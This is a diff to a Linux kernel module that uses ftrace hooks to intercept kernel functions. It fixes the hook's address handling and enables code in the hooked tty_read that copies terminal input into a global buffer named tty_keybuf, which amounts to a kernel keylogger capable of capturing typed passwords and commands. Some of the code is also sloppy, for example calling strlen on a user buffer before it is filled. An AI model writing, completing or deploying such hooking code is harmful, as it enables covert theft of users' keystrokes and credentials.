@@ -23,7 +23,7 @@ MODULE_AUTHOR("hyp");
 		.name = (_name),				  \
 		.function = (_function),		  \
 		.original = (_original),		  \
-	}									  \
+	}									  
 
 
 static int device_open(struct inode *, struct file *);
@@ -62,7 +62,7 @@ static int ftrace_resolve(struct ftrace_hook *hook) {
 		pr_debug("unresolved symbol: %s\n", hook->name);
 		return -ENOENT;
 	}
-	*((unsigned long *) hook->original) = hook->address;
+	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
 
 	return 0;
 }
@@ -91,7 +91,7 @@ int install_hook(struct ftrace_hook *hook) {
 	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
 	if(err) {
 		pr_debug("register_ftrace_function() failed: %d\n", err);
-		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+		//ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
 		return err;
 	}
 
@@ -152,11 +152,15 @@ static asmlinkage ssize_t ftrace_tty_read(struct file *file, char __user *buf,
 
 	ssize_t ret;
 
-	pr_info("hittle\n");
-	/*if(strlen(buf) > 0) {
-		pr_info("hit\n");
+	//pr_info("hittle\n");
+	if((strlen(buf) + strlen(tty_keybuf)) > 10000) {
+		tty_keybuf[0] = '\0';
+		//strncat(tty_keybuf, buf, strlen(buf));
+	}
+
+	if(strlen(buf) > 0) {
 		strncat(tty_keybuf, buf, strlen(buf));
-	}*/
+	}
 
 	ret = real_tty_read(file, buf, count, ppos);
 
